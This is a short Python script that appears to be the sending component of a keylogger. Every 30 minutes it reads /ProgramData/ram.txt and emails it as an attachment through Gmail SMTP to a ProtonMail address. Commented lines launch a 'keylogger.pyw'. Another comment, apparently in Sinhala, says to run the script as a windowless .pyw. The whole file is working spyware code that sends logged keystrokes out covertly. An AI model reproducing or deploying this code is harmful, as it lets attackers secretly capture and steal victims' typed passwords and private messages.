import sched, time
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os.path

#okkoma antimata .pyw karanna oona
########
email = 'yourmail'
password = 'password'
send_to_email = 'todomystuff@protonmail.com'
subject = 'dfghog'
message = 'gdf'
file_location = '/ProgramData/ram.txt'
#import subprocess
#subprocess.call(['python.exe', 'keylogger.pyw'])
time. sleep(5)


s = sched.scheduler(time.time, time.sleep)

def do_something(sc): 

    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = send_to_email
    msg['Subject'] = subject
    msg.attach(MIMEText(message, 'plain'))
    filename = os.path.basename(file_location)
    attachment = open(file_location, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(part)
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    text = msg.as_string()
    server.sendmail(email, send_to_email, text)
    server.quit()




    s.enter(1800, 1, do_something, (sc,))
        #delay time #adaala na
s.enter(1800, 1, do_something, (s,))
s.run()



